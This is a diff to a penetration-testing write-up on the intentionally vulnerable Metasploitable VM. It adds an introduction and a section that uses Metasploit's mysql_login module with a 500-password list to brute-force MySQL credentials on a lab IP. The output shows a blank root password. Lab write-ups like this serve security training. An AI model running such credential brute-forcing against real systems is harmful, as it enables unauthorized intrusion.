@@ -1,5 +1,9 @@
 # Writeup
 
+> The Metasploitable virtual machine is an intentionally vulnerable version of Ubuntu Linux designed for testing security tools and demonstrating common vulnerabilities.
+
+In this writeup, we will try to find most of the security issues affecting the VM.
+
 ## I. Recon
 
 A quick nmap scan gives us :
@@ -109,3 +113,26 @@ Server username: uid=33, gid=33, euid=33, egid=33
 So we get a nice shell, let's move on now to another web app.
 
 ## Phpmyadmin
+
+We can assume that phpmyadmin is backed by MySQL that is listening on port 3306.
+
+Let's try to use `auxiliary/scanner/mysql/mysql_login` with a small pass file (500 most commons) to brute-force the MySQL credentials.
+
+```
+msf > use auxiliary/scanner/mysql/mysql_login
+msf auxiliary(scanner/mysql/mysql_login) > set USERNAME root
+msf auxiliary(scanner/mysql/mysql_login) > set PASS_FILE ~/Desktop/Tools/500.txt
+msf auxiliary(scanner/mysql/mysql_login) > set RHOSTS 192.168.195.128
+msf auxiliary(scanner/mysql/mysql_login) > set BLANK_PASSWORDS true
+msf auxiliary(scanner/mysql/mysql_login) > run
+
+[+] 192.168.195.128:3306  - 192.168.195.128:3306 - Found remote MySQL version 5.0.51a
+[!] 192.168.195.128:3306  - No active DB -- Credential data will not be saved!
+[+] 192.168.195.128:3306  - 192.168.195.128:3306 - Success: 'root:'
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+So the MySQL root password is blank... But we can't connect as root with phpmyadmin. However, we are able to connect to the db with `mysql -u root -h 192.168.195.128 -P 3306 -p --skip-ssl`.
+
+
